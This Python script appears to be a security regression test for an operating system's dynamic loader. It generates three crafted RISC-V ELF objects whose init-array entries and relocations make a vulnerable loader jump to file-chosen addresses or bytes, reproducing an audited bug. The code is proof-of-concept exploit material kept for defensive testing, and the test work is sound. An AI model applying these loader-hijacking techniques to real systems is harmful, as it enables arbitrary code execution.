#!/usr/bin/env python3
"""Craft ET_DYN objects that abuse the *values* in ld-pagh's dynamic tables.

Copied into this repository from the round-2 runtime audit
(`Pagh-OS/attack/r2/runtime/rt2/pocs/make_init_evil.py`) so the F-r2-libc-1
fix stays regression-tested.  It is only used by `tools/live-security.py`; the
objects are written to a throw-away ext2 image, never installed.

The 0.15.1 loader validated where the dynamic table lived but not the values it
took from it and called:

* `evil_call_abs.elf` — a 512-byte ET_DYN whose DT_INIT_ARRAY entry is the
  literal `0x4141414141414141`; the loader called it verbatim, so its PC
  became a file-supplied word.
* `evil_call_rel.elf` — the same 8-byte array, but an `R_RISCV_RELATIVE` reloc
  rewrites the entry to `base + 0x180` and file offset 0x180 holds two
  RISC-V instructions.  The loader executed bytes selected by the file at an
  offset selected by the file, before checking the object's entry point.
* `evil_call_absrel.elf` — the SHN_ABS relocation arm: a writable
  `.init_array` slot is filled by an `R_RISCV_64` relocation against an
  SHN_ABS symbol whose value is `0x4141414141414141`, without knowing the load
  base.  A fixed loader refuses the relocation itself
  (`SHN_ABS symbol outside the image`).

Run: python3 tests/security/make_init_evil.py <outdir>
"""
import struct
import sys

ET_DYN, EM_RISCV = 3, 243
PT_LOAD, PT_DYNAMIC = 1, 2
SHT_STRTAB, SHT_DYNSYM, SHT_RELA = 3, 11, 4
SHN_ABS = 0xFFF1
STB_GLOBAL, STT_OBJECT = 1, 1
R_RISCV_64 = 2
DT_NULL, DT_INIT_ARRAY, DT_INIT_ARRAYSZ = 0, 25, 27


def ehdr(phoff, phnum, shoff, shnum, entry=0):
    return struct.pack("<16sHHIQQQIHHHHHH",
                       b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8,
                       ET_DYN, EM_RISCV, 1, entry, phoff, shoff, 0,
                       64, 56, phnum, 64, shnum, 0)


def phdr(t, flags, off, vaddr, filesz, memsz, align=0x1000):
    return struct.pack("<IIQQQQQQ", t, flags, off, vaddr, vaddr,
                       filesz, memsz, align)


def shdr(name, typ, flags, addr, off, size, link, info, align, entsize):
    return struct.pack("<IIQQQQIIQQ", name, typ, flags, addr, off, size,
                       link, info, align, entsize)


def write_at(buf, off, data):
    buf[off:off + len(data)] = data


def evil_abs():
    """DT_INIT_ARRAY[0] = 0x4141414141414141 (verbatim file word)."""
    buf = bytearray(0x200)
    write_at(buf, 0, ehdr(0x40, 2, 0, 0))
    write_at(buf, 0x40, phdr(PT_LOAD, 5, 0, 0, 0x200, 0x200))
    write_at(buf, 0x78, phdr(PT_DYNAMIC, 6, 0x1C0, 0x1C0, 0x30, 0x30, 8))
    write_at(buf, 0x100, struct.pack("<Q", 0x4141414141414141))
    write_at(buf, 0x1C0, struct.pack("<6Q", DT_INIT_ARRAY, 0x100,
                                      DT_INIT_ARRAYSZ, 8, DT_NULL, 0))
    return bytes(buf)


def evil_rel():
    """A relative relocation plants base+0x180; file bytes at 0x180 run."""
    buf = bytearray(0x2A0)
    write_at(buf, 0, ehdr(0x40, 2, 0x220, 2))
    write_at(buf, 0x40, phdr(PT_LOAD, 5, 0, 0, 0x2A0, 0x2A0))
    write_at(buf, 0x78, phdr(PT_DYNAMIC, 6, 0x1C0, 0x1C0, 0x30, 0x30, 8))
    write_at(buf, 0x100, struct.pack("<Q", 0))  # array[0], filled by RELA
    # payload at 0x180: lui x5,1 ; sd x0,0(x5) -> store page fault at 0x1000
    write_at(buf, 0x180, struct.pack("<II", 0x000002B7, 0x0002B023))
    write_at(buf, 0x1C0, struct.pack("<6Q", DT_INIT_ARRAY, 0x100,
                                      DT_INIT_ARRAYSZ, 8, DT_NULL, 0))
    # RELA: r_offset=0x100, r_info=type 3 (RELATIVE), addend=0x180
    write_at(buf, 0x200, struct.pack("<QQq", 0x100, 3, 0x180))
    write_at(buf, 0x220, shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
    write_at(buf, 0x260, shdr(0, SHT_RELA, 0, 0, 0x200, 24, 0, 0, 8, 24))
    return bytes(buf)


def evil_absrel():
    """A writable init array is filled by an SHN_ABS R_RISCV_64 relocation."""
    buf = bytearray(0x300)
    write_at(buf, 0, ehdr(0x40, 3, 0x240, 3))
    write_at(buf, 0x40, phdr(PT_LOAD, 5, 0, 0, 0x100, 0x100))    # R+X code
    write_at(buf, 0x78, phdr(PT_LOAD, 6, 0x100, 0x100, 0x200, 0x200))  # RW data
    write_at(buf, 0xB0, phdr(PT_DYNAMIC, 6, 0x100, 0x100, 0x30, 0x30, 8))
    # Dynamic table in the data segment, constructor array right after it.
    write_at(buf, 0x100, struct.pack("<6Q", DT_INIT_ARRAY, 0x140,
                                      DT_INIT_ARRAYSZ, 8, DT_NULL, 0))
    write_at(buf, 0x140, struct.pack("<Q", 0))  # filled by the RELA
    # .dynsym: null + SHN_ABS symbol with an arbitrary 64-bit value.
    write_at(buf, 0x180, struct.pack("<IBBHQQ", 0, 0, 0, 0, 0, 0))
    write_at(buf, 0x198, struct.pack("<IBBHQQ", 1,
                                      (STB_GLOBAL << 4) | STT_OBJECT,
                                      0, SHN_ABS, 0x4141414141414141, 8))
    write_at(buf, 0x1C0, b"\x00abs\x00")
    # RELA: r_offset=0x140, symbol 1, R_RISCV_64, addend 0.
    write_at(buf, 0x200, struct.pack("<QQq", 0x140,
                                      (1 << 32) | R_RISCV_64, 0))
    write_at(buf, 0x240, shdr(0, SHT_DYNSYM, 0, 0x180, 0x180, 48, 1, 0, 8, 24))
    write_at(buf, 0x280, shdr(0, SHT_STRTAB, 0, 0x1C0, 0x1C0, 8, 0, 0, 1, 0))
    write_at(buf, 0x2C0, shdr(0, SHT_RELA, 0, 0, 0x200, 24, 1, 0, 8, 24))
    return bytes(buf)


OBJECTS = (
    ("evil_call_abs.elf", evil_abs),
    ("evil_call_rel.elf", evil_rel),
    ("evil_call_absrel.elf", evil_absrel),
)


def main():
    if len(sys.argv) != 2:
        sys.stderr.write("usage: make_init_evil.py <outdir>\n")
        return 2
    out = sys.argv[1].rstrip("/")
    for name, build in OBJECTS:
        with open(out + "/" + name, "wb") as fh:
            fh.write(build())
        print("wrote %s/%s" % (out, name))
    return 0


if __name__ == "__main__":
    sys.exit(main())